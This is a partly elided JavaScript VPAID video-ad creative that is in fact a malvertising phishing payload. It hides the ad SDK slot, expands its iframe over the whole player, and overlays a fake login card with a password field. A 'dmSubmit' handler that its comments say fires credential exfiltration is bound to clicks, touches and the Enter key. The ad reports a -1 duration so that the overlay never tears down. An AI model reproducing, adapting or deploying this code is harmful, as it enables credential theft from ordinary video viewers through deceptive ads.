(function() {
  ...
  // Same visual as original v1, no cookie exfil, frame never expires (duration=-1).
  ...
  VpaidAd.prototype.initAd = function(w,h,vm,d,e,p) {
    ...
    // Hide IMA SDK transparent slot so it doesn't eat clicks
    try { if(p&&p.slot) p.slot.style.cssText='pointer-events:none!important;display:none!important'; } catch(_){}

    // Expand the VPAID iframe to cover the entire player (same as v1)
    try {
    ...
    // Credential submit — fires exfil then resumes video
    function dmSubmit() {
      ...
      if(el) el.remove();
      self._fire('AdStopped'); // resume video
    }
    window.dmSubmit = dmSubmit;

    // Overlay — centered card, same visual as v1
    var overlay = document.createElement('div');
    overlay.id = 'dm-phish';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent';
    overlay[IH] = [
      '<div style="position:fixed;top:0;left:0;width:100%;height:100%;',
        ...
        '<div style="background:#fff;border-radius:10px;padding:36px 40px;',
          ...
          '<button onclick="window.dmSubmit&&window.dmSubmit();return false"',
          ...
          '<div style="text-align:center;margin-top:16px">',
            '<a href="#" onclick="return false"',
              ' style="color:#FF7900;font-size:12.5px;text-decoration:none">Forgot password?</a>',
          '</div>',
        '</div>',
      '</div>'
    ].join('');
    ...
    // Belt-and-suspenders listener on top of the onclick attribute
    try {
      var btn = overlay.querySelector('button');
      if(btn) {
        btn.addEventListener('click',    dmSubmit, false);
        btn.addEventListener('mouseup',  dmSubmit, false);
        btn.addEventListener('touchend', dmSubmit, false);
      }
      var pass = document.getElementById('dm-ph-pass');
      if(pass) pass.addEventListener('keydown', function(e){
        if(e.key==='Enter'||e.keyCode===13) dmSubmit();
      }, false);
    } catch(_){}
  ...
  VpaidAd.prototype.startAd = function() {
    ...
    // Never fire AdStopped automatically — duration=-1 keeps the player
    // waiting indefinitely, so the ad iframe (and our overlay) never tears down.
  };
  ...
  VpaidAd.prototype.getAdRemainingTime  = function(){ return -1; }; // never expires
  VpaidAd.prototype.getAdDuration       = function(){ return -1; }; // never expires
